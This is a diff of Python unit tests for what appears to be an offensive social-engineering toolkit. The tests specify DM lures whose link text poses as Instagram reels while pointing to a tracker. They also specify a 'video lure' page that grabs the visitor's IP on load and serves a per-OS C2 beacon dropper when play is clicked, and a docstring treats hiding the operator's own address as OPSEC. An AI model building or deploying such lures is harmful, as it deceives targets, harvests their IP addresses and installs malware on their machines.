@@ -232,8 +232,19 @@ class TestPublicBaseUrl(unittest.TestCase):
             self.assertEqual(public_base_url("1.2.3.4", 9999), "http://1.2.3.4:9999")
 
     def test_wildcard_host_becomes_localhost(self):
+        """A wildcard host must NOT leak the operator's LAN address into a
+        lure link — silently exposing the operator's box is an OPSEC
+        failure; localhost is the safe local fallback and real lure
+        delivery is gated until a public domain is configured."""
         with patch.dict("os.environ", {"PHANTOM_TRACK_URL": ""}):
-            self.assertEqual(public_base_url("0.0.0.0", 8080), "http://127.0.0.1:8080")
+            self.assertEqual(public_base_url("0.0.0.0", 8080),
+                             "http://127.0.0.1:8080")
+
+    def test_configured_domain_wins(self):
+        with patch.dict("os.environ",
+                        {"PHANTOM_TRACK_URL": "https://cdn-portal.example"}):
+            self.assertEqual(public_base_url("0.0.0.0", 8080),
+                             "https://cdn-portal.example")
 
 
 class _FakeGrabber:
@@ -321,6 +332,107 @@ class TestSocialEngine(unittest.TestCase):
         self.assertTrue(ok)
         self.assertTrue(any("channel=sms" in l for l in lines))
         self.assertIn("@vtext.com", sent["to"])
+
+
+class TestMaskedDmLinks(unittest.TestCase):
+    """Where the channel renders link TEXT (Telegram HTML / Discord
+    markdown), the DM shows a plausible platform share URL while the
+    destination stays the tracker. Channels without that capability keep
+    the raw URL — never pretend the domain is hidden when it is not."""
+
+    def test_html_mask(self):
+        from phantom.automation.social.social_dm import mask_link
+        link = "https://cdn.example/reel/abc"
+        out = mask_link(f"see {link}", link, "instagram.com/reel/abc", "html")
+        self.assertIn("<a href=\"https://cdn.example/reel/abc\">", out)
+        self.assertIn("instagram.com/reel/abc</a>", out)
+
+    def test_markdown_mask(self):
+        from phantom.automation.social.social_dm import mask_link
+        link = "https://cdn.example/reel/abc"
+        out = mask_link(f"see {link}", link, "instagram.com/reel/abc",
+                        "markdown")
+        self.assertIn("[instagram.com/reel/abc](https://cdn.example/reel/abc)",
+                      out)
+
+    def test_capability_flags(self):
+        from phantom.automation.social.social_dm import (
+            ConsoleDMTransport, DiscordDMTransport, TelegramDMTransport)
+        self.assertTrue(TelegramDMTransport.supports_masked_link)
+        self.assertTrue(DiscordDMTransport.supports_masked_link)
+        self.assertFalse(ConsoleDMTransport.supports_masked_link)
+
+    def test_launch_dm_masks_only_when_supported(self):
+        from phantom.automation.social import social_dm
+
+        class _Capture(social_dm.DMTransport):
+            platform = "capture"
+            supports_masked_link = False
+
+            def __init__(self):
+                self.sent = []
+
+            def send(self, target, text, timeout=15.0):
+                self.sent.append(text)
+                return True
+
+        link = "https://cdn.example/reel/abc"
+        cap = _Capture()
+        social_dm.launch_dm(["@victim"], "collab", link=link, transport=cap,
+                            context={"name": "X", "platform": "instagram"},
+                            display="instagram.com/reel/abc")
+        self.assertIn(link, cap.sent[0])          # raw URL, unmasked
+        self.assertNotIn("<a href", cap.sent[0])
+
+
+class TestTwoInOneVideoLure(unittest.TestCase):
+    """The DM lure must be BOTH: IP grab on page load AND beacon dropper
+    on the play click — with a pure IP-grab reel as the fallback when the
+    C2 is not running (the IP is the floor value, the beacon the bonus)."""
+
+    class _Link:
+        def __init__(self):
+            self.short_url = "https://cdn.example/reel/abc"
+            self.code = "dm-abc"
+
+    class _Grabber:
+        def __init__(self):
+            self.calls = []
+
+        def create_player_link(self, **kw):
+            self.calls.append(("player", kw))
+            return TestTwoInOneVideoLure._Link()
+
+        def create_video_share_link(self, **kw):
+            self.calls.append(("share", kw))
+            return TestTwoInOneVideoLure._Link()
+
+    def _engine_with(self, payloads):
+        engine = SocialEngine()
+        engine._grabber = self._Grabber()
+        engine._c2_payload_urls = lambda: payloads
+        return engine
+
+    def test_c2_up_uses_dropper_player(self):
+        engine = self._engine_with({"windows": "https://c2/api/v1/payload",
+                                    "linux": "https://c2/api/v1/payload_linux"})
+        engine._video_lure_link(None, label="dm")
+        kind, kw = engine._grabber.calls[-1]
+        self.assertEqual(kind, "player")
+        # per-OS map travels with the link: the page picks the visitor's OS
+        self.assertEqual(kw["payload_urls"]["windows"],
+                         "https://c2/api/v1/payload")
+
+    def test_c2_down_falls_back_to_ip_grab(self):
+        engine = self._engine_with({})
+        engine._video_lure_link(None, label="dm")
+        kind, kw = engine._grabber.calls[-1]
+        self.assertEqual(kind, "share")
+        self.assertNotIn("payload_urls", kw)
+
+    def test_c2_payload_urls_empty_without_listener(self):
+        """No listener -> no beacon URLs (never a broken link)."""
+        self.assertEqual(SocialEngine()._c2_payload_urls(), {})
 
 
 if __name__ == "__main__":
